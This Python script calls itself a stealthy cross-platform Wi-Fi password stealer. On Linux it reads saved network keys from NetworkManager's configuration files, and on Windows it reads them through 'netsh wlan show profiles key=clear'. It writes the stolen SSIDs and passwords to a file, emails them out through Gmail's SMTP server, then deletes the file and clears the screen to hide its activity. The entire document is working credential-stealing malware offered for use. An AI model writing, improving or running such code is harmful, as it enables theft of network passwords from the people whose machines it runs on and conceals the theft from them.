# cross platform  wifi password stealer 
# mac_os to be added :)
# fsociety wifi password stealer ;)
# stealthy version

from subprocess import run
import platform 
import os
import re
import sys
import smtplib
import time

def systemOS():
	os = platform.system()

	return os


def linux():
	if os.getuid() != 0:
		sys.exit('[-] run this with sudo permissions! ')
	print('[*] mode: stealthy')
	alldata = []
	files = os.listdir('/etc/NetworkManager/system-connections/')
	for file in files:
		with open(f'/etc/NetworkManager/system-connections/{file}', 'r', encoding='latin1') as d:
			data = d.read() 
			pattern = re.compile(R'psk=.+')
			passwords = pattern.findall(data)
			ssidandpasswords = str(f"SSID={file}, {''.join(passwords)}.".replace('.nmconnection', '').replace('psk=','password='))
			alldata.append(ssidandpasswords)
			datafile = open('fsociety.txt' ,'w')
			datalog = datafile.write(str('\n'.join(alldata)))
	m = open('fsociety.txt', 'a')
	msg = m.write('\n\n[*] there is an extra dot in the end of everypassword') 
	print("[*] passwords extracted successfully sending them over gmail")




def windows():
	print('[*] mode: stealthy')
	alldata = []
	profiles = run(['netsh' ,'wlan', 'show' ,'profiles'], capture_output=True).stdout.decode()
	pattern = re.compile(R"All User Profile     : (.*)\r")
	all_ssid = pattern.findall(profiles)
	for ssid in all_ssid:
		command2 = run(['netsh' ,'wlan', 'show' ,'profiles', ssid, 'key=clear'], capture_output=True).stdout.decode()
		pattern = re.compile(R'Key Content            : (.*)\r')
		passwords = pattern.findall(command2)
		ssidandpasswords = f"SSID={ssid}, password={''.join(passwords)}"
		alldata.append(ssidandpasswords)
		datafile = open('fsociety.txt' ,'w')
		datalog = datafile.write(str('\n'.join(alldata))) 
	
	print("[*] passwords extracted successfully sending them over gmail")


def gmail():
	passwords_list = open('fsociety.txt', 'r').readlines()
	passwords = ''.join(passwords_list)
	email = "<GMAIL HERE>" # MAKE SURE TO ENABLE (Less Secure App Access) option on your gmail account 
	password = '<GMAIL PASSWORD>'
	server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
	logged_in = server.login(email, password)
	if logged_in:
		print('[*] logged in successfully and sending the passwords')
		server.sendmail(email, email, passwords)



def clear_screen_linux():
	print('[*] clearing the screen after 5 seconds')
	time.sleep(5)
	os.system('clear')


def clear_screen_windows():
	print('[*] clearing the screen after 5 seconds')
	time.sleep(5)
	os.system('cls')	


if systemOS() == 'Windows':
	print('[*] operating system: WINDWOS ')
	windows()
	gmail()
	print('[*] removing (fsociety.txt)')
	os.system('del fsociety.txt')
	clear_screen_windows()

if systemOS() == 'Linux':
	print('[*] operating system: LINUX ')
	linux()
	gmail()
	print('[*] removing (fsociety.txt)')
	os.system('rm fsociety.txt')
	clear_screen_linux()

